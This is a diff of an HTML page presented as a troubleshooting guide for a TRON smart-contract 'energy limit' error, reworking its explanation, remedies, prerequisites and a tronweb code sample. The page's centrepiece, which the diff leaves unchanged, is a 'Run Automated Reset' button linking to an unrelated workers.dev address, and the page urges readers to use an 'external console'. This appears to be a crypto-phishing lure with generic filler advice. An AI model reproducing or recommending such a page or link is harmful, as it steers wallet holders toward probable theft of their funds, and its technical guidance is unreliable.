@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff7b2c; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -45,29 +45,31 @@
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs when a smart contract's energy consumption exceeds the maximum allowed limit, causing the contract's execution to fail and resulting in the error message.</li>
+<li>The error occurs due to an unexpected surge in energy usage, often caused by inefficient contract code, excessive loop iterations, or an unusually high volume of transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Adjust the contract's energy limit by modifying the <code>energy_limit</code> parameter in the contract's settings.</li>
-<li>Optimize the contract's code to reduce energy consumption by minimizing unnecessary computations and data storage.</li>
-<li>Update the contract's configuration using the following JSON code block:</li>
+<li>Adjust the contract's energy limit to prevent excessive consumption:</li>
+<li>Increase the <code>energyLimit</code> parameter in the contract deployment script</li>
+<li>Optimize contract code to reduce computational complexity</li>
+<li>Implement rate limiting to throttle transaction volumes</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;contract_address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TX......&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;energy_limit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10000</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;parameters&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;optimizer_enabled&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>tronweb.txBuilder.createSmartContract<span class="o">(</span>
+<span class="w">  </span><span class="s2">&quot;contract_address&quot;</span>,
+<span class="w">  </span><span class="s2">&quot;contract_abi&quot;</span>,
+<span class="w">  </span><span class="o">{</span>
+<span class="w">    </span><span class="s2">&quot;feeLimit&quot;</span>:<span class="w"> </span><span class="m">100000000</span>,
+<span class="w">    </span><span class="s2">&quot;energyLimit&quot;</span>:<span class="w"> </span><span class="m">100000000</span>
+<span class="w">  </span><span class="o">}</span>
+<span class="o">)</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more granular control over contract configurations.</p>
+<p>Consider utilizing an external console for further debugging and contract optimization. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>TRON wallet with sufficient funds</li>
-<li>TRON network node with the latest software version</li>
-<li>Basic understanding of smart contract development and deployment on TRON</li>
+<li>Familiarity with TRON's smart contract development framework</li>
+<li>Understanding of energy consumption mechanics on the TRON network</li>
+<li>Access to the TRONWeb library for contract deployment and management</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
